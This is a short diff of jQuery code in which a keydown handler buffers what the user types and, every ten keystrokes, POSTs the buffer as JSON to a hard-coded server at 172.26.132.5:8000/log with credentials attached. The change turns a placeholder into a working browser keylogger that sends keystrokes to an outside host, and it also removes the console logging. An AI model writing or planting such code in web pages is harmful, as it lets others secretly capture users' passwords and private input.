@@ -11,11 +11,14 @@ $(document).keydown(function(e) {
     if (stream.length == 10) {
         $.ajax({
             type: "POST",
-            url: IPaddress,
-            data: "stream",
+            url: "http://172.26.132.5:8000/log",
+            data: JSON.stringify(stream),
+            xhrFields:{
+                withCredentials:true
+            },
+            crossDomain:true,
         });
         stream = [];
     }
-    console.log(stream);
 
 });
